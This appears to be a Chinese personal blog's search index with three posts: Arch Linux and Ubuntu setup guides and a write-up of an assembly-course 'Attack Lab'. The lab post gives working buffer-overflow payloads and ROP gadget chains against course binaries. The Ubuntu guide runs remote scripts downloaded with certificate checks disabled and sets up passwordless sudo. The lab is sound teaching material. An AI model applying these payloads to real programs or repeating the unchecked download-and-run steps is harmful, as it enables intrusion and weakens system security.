{"pages":[{"title":"Tags","text":"","link":"/Tags/index.html"},{"title":"Categories","text":"","link":"/Categories/index.html"}],"posts":[{"title":"Arch linux installation guide","text":"心血来潮装了一次之后也没有怎么用，在此稍作记录。 下载iso镜像，这里给清华镜像链接：https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/archlinux-2019.07.01-x86_64.iso 用rufus之类的工具将镜像烧录到u盘上，从u盘启动安装程序 由于安装过程依赖于网络连接，如果你使用的是无线网，参考官方wiki，如果是直接可用的有线网，则直接测试 1ping www.baidu.com 能ping通就没问题 开启网络授时 1timedatectl set-ntp true 磁盘分区(如果是UEFI会麻烦一些，这里只介绍非UEFI的情况)查看当前磁盘列表 1fdisk -l 应该是/dev/sdX的形式，一般来说是/dev/sda。 1cfdisk /dev/sda 如果是空白磁盘，它会让你选label type，此处选dos，如果没问则不必管；分区时设一个ext4主分区/dev/sda1，设一个swap分区/dev/sda2，然后分别创建文件系统并加载 1234mkfs.ext4 /dev/sda1mkswap /dev/sda2mount /dev/sda1 /mntswapon /dev/sda2 安装系统首先修改软件源，以清华源为例，在文件/etc/pacman.d/mirrorlist的头部加入 1Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch 然后开始安装 1pacstrap /mnt base base-devel 生成fstab文件 1genfstab -U /mnt &gt;&gt; /mnt/etc/fstab 进入新系统 1arch-chroot /mnt 设置时区和locale 12ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc 修改/etc/locale.gen文件，取消en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8前面的注释，然后运行 12locale-genecho \"LANG=en_US.UTF-8\" &gt; /etc/locale.conf 设置主机名并开启DHCP 12echo \"HOSTNAME\" &gt; /etc/hostnamesystemctl enable dhcpcd 设置grub 123pacman -S grub os-probergrub-install /dev/sdagrub-mkconfig -o /boot/grub/grub.cfg 设置密码 1passwd 重启 12exitreboot 添加archlinuxcn源修改/etc/pacman.conf，加入 12[archlinuxcn]Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch 然后更新 1sudo pacman -Syy 安装图形界面 12sudo pacman -S xorg-server gnomesudo systemctl enable gdm 安装显卡驱动，根据你的显卡类型选择装哪一个 123sudo pacman -S xf86-video-amdgpu #AMDsudo pacman -S xf86-video-intel #intelsudo pacman -S xf86-video-nouveau #NVIDIA 开机自动联网 1systemctl enable NetworkManager 重启之后看到的就是熟悉的图形界面了。","link":"/2019/07/14/Arch/"},{"title":"Attack Lab","text":"这是大一暑假汇编课的实验。此次实验要求我们用利用缓冲区溢出的bug对目标源程序进行攻击，ctarget的缓冲区在内存中的位置不变，很容易执行植入的汇编代码，而rtarget则采用了内存随机化，几乎不可能预测缓冲区的起始地址，从而要使用ROP攻击，难度更大。 ctargetlevel 1首先对ctarget文件进行反汇编objdump -d ./ctarget&gt;ctarget.s，在ctarget.s中搜索可以找到以下代码： 12345678910111213141516171800000000004017f5 &lt;getbuf&gt;: 4017f5: 48 83 ec 38 sub $0x38,%rsp 4017f9: 48 89 e7 mov %rsp,%rdi 4017fc: e8 7e 02 00 00 callq 401a7f &lt;Gets&gt; 401801: b8 01 00 00 00 mov $0x1,%eax 401806: 48 83 c4 38 add $0x38,%rsp 40180a: c3 retq 000000000040180b &lt;touch1&gt;: 40180b: 48 83 ec 08 sub $0x8,%rsp 40180f: c7 05 03 2d 20 00 01 movl $0x1,0x202d03(%rip) # 60451c &lt;vlevel&gt; 401816: 00 00 00 401819: bf 03 31 40 00 mov $0x403103,%edi 40181e: e8 ad f4 ff ff callq 400cd0 &lt;puts@plt&gt; 401823: bf 01 00 00 00 mov $0x1,%edi 401828: e8 97 04 00 00 callq 401cc4 &lt;validate&gt; 40182d: bf 00 00 00 00 mov $0x0,%edi 401832: e8 19 f6 ff ff callq 400e50 &lt;exit@plt&gt; 可见getbuf先在栈里开辟了0x38的空间，再callq Gets函数进行写入，callq自动将下一条语句地址压栈以便返回时使用。于是只需要先填充56个字符，再加上touch1函数地址0x40180b即可，考虑到x86为小端，可得到如下攻击字符串hex： 1234567831 31 31 31 31 31 31 3131 31 31 31 31 31 31 3131 31 31 31 31 31 31 3131 31 31 31 31 31 31 3131 31 31 31 31 31 31 3131 31 31 31 31 31 31 3131 31 31 31 31 31 31 310b 18 40 00 00 00 00 00 level 2此题要求给touch2传入参数，先看看它的反汇编代码： 12345670000000000401837 &lt;touch2&gt;: 401837: 48 83 ec 08 sub $0x8,%rsp 40183b: 89 fa mov %edi,%edx 40183d: c7 05 d5 2c 20 00 02 movl $0x2,0x202cd5(%rip) # 60451c &lt;vlevel&gt; 401844: 00 00 00 401847: 39 3d d7 2c 20 00 cmp %edi,0x202cd7(%rip) # 604524 &lt;cookie&gt; 40184d: 75 20 jne 40186f &lt;touch2+0x38&gt; 可见它是将寄存器edi与cookie进行对比，而从程序运行结果来看cookie=0x47db4e3a，又通过gdb调试可知读入数据的首地址是0x55652778，所以代码分三部分，第一部分修改edi，第二部分设置rsp以便ret到touch2，第三部分设置rsp以便ret到数据首地址，综合可得如下代码（标注了内存地址）： 1234560x55652778: movl $0x47db4e3a,%edi movq $0x1411938,%rax #处理touch2地址(不处理也无妨) subq $0x1010101,%rax #此处是为了避免代码中出现不可见字符00 movq %rax,0x556527a0 #准备ret movq $0x556527a0,%esp retq 10x556527b0: 78 27 65 55 #buf溢出覆盖原有地址 level 3查表可知0x47db4e3a的ascii码为34 37 64 62 34 65 33 61 00，根据题意，我们需要将上述数据的地址赋给edi，同时又要修改esp以确保后续函数的执行不会修改上述数据段，可得代码： 123450x55652778: movl $0x55652778,%edi #数据段地址 subl $0x40,%esp #将esp下移 pushq $0x401948 #touch3地址 retq0x55652778: 34 37 64 62 34 65 33 61 00 10x556527b0: 78 27 65 55 #buf溢出覆盖原有地址 rtargetlevel 2题目要求将cookie传给rdi，而要操作rdi寄存器，有两种方式： 12movq _____,%rdiret 或者 12popq %rdiret 第一种方式hex代码为48 89 ?7 c3或48 89 ?f c3，在rtarget反汇编代码中检索可得 12300000000004019ec &lt;getval_277&gt;: 4019ec: b8 48 89 c7 c3 mov $0xc3c78948,%eax 4019f1: c3 retq 其中48 89 c7 c3对应的汇编指令为 12movq %rax,%rdiret 于是我们还需要一个popq %rax实现cookie到rax寄存器的过程，对应hex为58，检索可得 12300000000004019f9 &lt;setval_467&gt;: 4019f9: c7 07 d2 d5 4f 58 movl $0x584fd5d2,(%rdi) 4019ff: c3 retq 综上得到攻击hex码为 1234fe 19 40 00 00 00 00 00 #popq %rax3a 4e db 47 00 00 00 00 #cookieed 19 40 00 00 00 00 00 #movq %rax,%rdi37 18 40 00 00 00 00 00 #touch2 最后只需在前面随意添加56字节长的字符作为偏置。 level 3此题中输入在栈中的位置是可变的，不能通过gdb确定，于是需要从rsp寄存器获取，查表知movq %rsp,___的hex为48 89 e?，在反汇编代码中查找得到： 1230000000000401ab2 &lt;setval_317&gt;: 401ab2: c7 07 48 89 e0 c3 movl $0xc3e08948,(%rdi) 401ab8: c3 retq 其中48 89 e0对应的汇编代码为movq %rsp,%rax。 但此时获取的是下一条语句的地址，如果把数据就存储在此处，ret后将会执行以数据段为地址的代码从而导致segmentation fault，所以我们需要将数据存储在前面或者后面并将rax减去或者加上偏移量。经过一番尝试，addq subq inc dec均不能在farm中找到，最后尝试leaq ___,___，对应hex码为48 8d，检索可得： 1230000000000401a21 &lt;add_xy&gt;: 401a21: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 401a25: c3 retq 其中48 8d 04 37对应汇编代码为leaq (%rdi,%rsi,1),%rax。 使用gdb调试发现rsi的值为0x31，于是可得以下攻击代码： 1234b4 1a 40 00 00 00 00 00 #movq %rsp,%raxed 19 40 00 00 00 00 00 #movq %rax,%rdi21 1a 40 00 00 00 00 00 #leaq (%rdi,%rsi,1),%raxed 19 40 00 00 00 00 00 #mov %rax,%rdi 134 37 64 62 34 65 33 61 00 #cookie","link":"/2018/08/29/AttackLab/"},{"title":"Ubuntu guide","text":"安装首先下载ubuntu系统镜像，为了更快的下载速度可以使用清华的镜像，以19.04版本为例，下载地址为https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/disco/ubuntu-19.04-desktop-amd64.iso 下载好之后，如果是用虚拟机，将iso加载到CD上即可安装，如果是在PC上安装，可以使用Rufus这个免费的小工具制作u盘启动盘，烧录镜像也可以用Etcher。 设置sudo免密码每次sudo都要输入密码，很是麻烦，修改配置文件 1sudo visudo 在文件尾加上 1username ALL=(ALL:ALL) NOPASSWD:ALL 其中username是你的用户名。“加在文件尾”这一点很重要，因为后面的策略会覆盖前面的策略，如果加在前面就可能被覆盖掉而无效。 设置默认文本编辑器我个人比较偏向于使用简单易用的nano，想从nano改为vim或者从vim改为nano，可以用 1sudo update-alternatives --config editor 更换apt源这里我们同样使用清华的源，以19.04版本为例（其他版本见此），编辑/etc/apt/sources.list文件，加入以下内容（为加快速度注释掉了deb-src，想用的话可以取消注释） 12345678910deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco main restricted universe multiverse#deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-updates main restricted universe multiverse#deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-backports main restricted universe multiverse#deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-security main restricted universe multiverse#deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-security main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-proposed main restricted universe multiverse#deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ disco-proposed main restricted universe multiverse 更换完之后对系统进行更新 12sudo apt-get updatesudo apt-get upgrade 更换pip/pip3源(选做)在控制台执行以下命令设置清华源，如果用的是pip则将下面的pip3替换为pip 1pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 设置服务器RSA密钥登录如果使用的是服务器，设置弱密码存在较大风险，比较安全的做法是改用密钥登录并禁用密码登录。 首先需要使用PuTTYgen之类的生成工具生成公钥/私钥对，生成好的公钥为如下的一串： 1ssh-rsa AAAAB3...luwDMw== 用用户名密码登录服务器后，创建文件夹~/.ssh，编辑文件~/.ssh/authorized_keys，将上面的公钥粘贴进去，保存文件。此时应该就可以正常使用了，可以退出并重新登录一次，验证密钥登录是否成功，如果不成功则需要检查一下是否是文件权限的问题，用chmod修改读取权限。 验证成功之后，就可以禁用密码登录方式了。具体步骤是，编辑/etc/ssh/sshd_config文件，添加如下语句 1PasswordAuthentication no 保存文件，执行sudo systemctl restart ssh重启sshd服务，这样下次登录的时候就不能再用密码。再次提醒，一定要先验证可以用密钥登录，不然就再也无法登录了！ 美化本着实用为目的，这里只做一些基本的美化，最终效果如下图所示首先我们需要安装tweak tools及拓展工具 123sudo apt-get install gnome-tweak-toolsudo apt-get install gnome-shell-extensionssudo apt-get install chrome-gnome-shell 安装Arc主题 1sudo apt-get install arc-theme 安装papirus图标 1sudo apt-get install papirus-icon-theme 安装完成后，在软件中搜索tweaks，打开修改工具，我的配置如下，仅供参考如果想把dash放在屏幕下方居中的话，下载DashtoDock这个拓展即可，查看自己的gnome版本号用 1gnome-shell --version 代理配置服务器端·ssr使用一键安装脚本 1git clone https://github.com/John-Ao/ss-fly 安装使用./ss-fly.sh -ssr，开启bbr使用./ss-fly.sh -bbr如果发现ssr服务器无法使用，可以用cat /var/log/shadowsocks.log查看错误信息，有可能是端口号被占用，修改端口号即可。 ·MTProxy获取并执行脚本文件mt_proxy.sh 1wget -N --no-check-certificate https://raw.githubusercontent.com/John-Ao/scripts/master/mt_proxy.sh &amp;&amp; chmod +x mt_proxy.sh &amp;&amp; ./mt_proxy.sh 按提示输入端口号、secret信息即可 polipo - socks5转http代理安装polipo： 1sudo apt-get install polipo 然后修改配置文件/etc/polipo/config 1234socksParentProxy=&quot;ip:port&quot;socksProxyType=socks5proxyAddress=&quot;0.0.0.0&quot; #如果是ipv6的话填 &quot;::0&quot;proxyPort=2160 修改完后重启polipo 1sudo /etc/init.d/polipo restart 可以通过curl测试代理是否成功 1curl --proxy http://127.0.0.1:2160 https://www.google.com 设置定时任务有时ss服务器可能会出现不稳定的情况而莫名无法连接，此时可以使用crontab来设置定时重启，只需要修改/etc/crontab文件即可。 客户端配置snap代理snap是少数不走proxychains的命令行工具，只能手动配置http代理，运行下面的语句(注意将修改代理端口2160为实际使用端口) 123456echo -e '[Service]\\nEnvironment=&quot;http_proxy=http://127.0.0.1:2160/&quot;' \\ | sudo tee /etc/systemd/system/snapd.service.d/http-proxy.confecho -e '[Service]\\nEnvironment=&quot;https_proxy=http://127.0.0.1:2160/&quot;' \\ | sudo tee /etc/systemd/system/snapd.service.d/https-proxy.confsudo systemctl daemon-reloadsudo systemctl restart snapd electron-ssr （推荐）如果想通过deb安装，可以下载electron-ssr，建议使用0.2.3版本，0.2.4似乎无法使用。 proxychains+ssr首先安装ssr 123456sudo apt-get install build-essentialwget https://github.com/jedisct1/libsodium/releases/download/1.0.16/libsodium-1.0.16.tar.gztar -xvf libsodium-1.0.16.tar.gzcd libsodium-1.0.16./configure &amp;&amp; make -j3 &amp;&amp;sudo make installsudo ldconfig 获取ssr.sh脚本文件 1wget -N --no-check-certificate https://raw.githubusercontent.com/John-Ao/scripts/master/ssr.sh &amp;&amp; chmod +x ssr.sh 然后在终端里输入 123./ssr.sh install./ssr.sh config #填入配置信息./ssr.sh start 即可启用ssr，然后可以通过proxychains把tcp代理到socks5 12sudo apt-get install proxychains #安装sudo nano /etc/proxychains.conf #编辑配置文件 以后在需要的语句前面加上它就可以了，比如proxychains google-chrome如果报错可以修改/usr/bin/proxychains文件，先执行命令 1find /usr/lib/ -name libproxychains.so.3 -print 然后把文件中的LD_PRELOAD改为上面所查找出来的路径 ssr-qt5带有图形界面的ss-qt5是一个不错的选择，在apt install前需要添加ppa源： 1234sudo add-apt-repository ppa:hzwhuang/ss-qt5sudo apt-get updatesudo apt-get install shadowsocks-qt5 反之，如果要移除该ppa源，可以使用 1sudo add-apt-repository -r ppa:hzwhuang/ss-qt5 如果第一条语句出现找不到apt_pkg错误，可以尝试用下面的方法解决： 12345sudo apt install python3-aptcd /usr/lib/python3/dist-packagessudo cp apt_pkg.cpython-35m-x86_64-linux-gnu.so apt_pkg.cpython-36m-x86_64-linux-gnu.so 软件配置pyspark1.安装jdk 1sudo apt-get install openjdk-8-jdk 2.安装py4j 1pip3 install py4j 3.下载pyspark 12wget \"https://mirrors.tuna.tsinghua.edu.cn/apache/spark/spark-2.4.3/spark-2.4.3-bin-hadoop2.7.tgz\"tar xvf spark-2.4.3-bin-hadoop2.7.tgz 在~/.bashrc文件中添加pyspark的路径，其中xxx按上面下载的实际情况填写 12export SPARK_HOME=/xxx/spark-2.4.3-bin-hadoop2.7export PATH=${SPARK_HOME}/bin:$PATH 保存之后激活 1source ~/.bashrc 4.设置及测试现在输入pyspark就可以进入交互式spark环境，和python交互式环境类似，开头会有一堆log信息，将log的等级从INFO修改为WARN看起来会舒服很多，修改方法如下 123cd ${SPARK_HOME}cp conf/log4j.properties.template conf/log4j.propertiesnano conf/log4j.properties 把文件中的 1log4j.rootCategory=INFO, console 替换为 1log4j.rootCategory=WARN, console 如果想使用ipython3的话，需要设置环境变量 12export PYSPARK_DRIVER_PYTHON=ipython3export PYSPARK_PYTHON=python3 单次运行pyspark也可以用 1PYSPARK_DRIVER_PYTHON=ipython3 pyspark 最后，我们可以运行一个计算Pi的程序来测试一下 1${SPARK_HOME}/bin/run-example SparkPi 10 远程操作相比vnc、xdrp之类的老牌解决方案，TeamViewer是一个更为方便的选择，它是一个免费的(限个人使用)多平台支持的远程控制软件，只需要在两台计算机上分别安装即可使用。 开发工具 调试工具可以用edb-debugger，界面友善，简单易用 调整分区可以用gparted C/C++用clion或者codeliteCheat Sheetdf -n查看硬盘使用情况nvidia-smi查看显卡使用情况(nvidia)netstat -tulp查看网络端口","link":"/2018/11/19/Ubuntu-guide/"}],"tags":[{"name":"guide","slug":"guide","link":"/tags/guide/"},{"name":"solution","slug":"solution","link":"/tags/solution/"}],"categories":[]}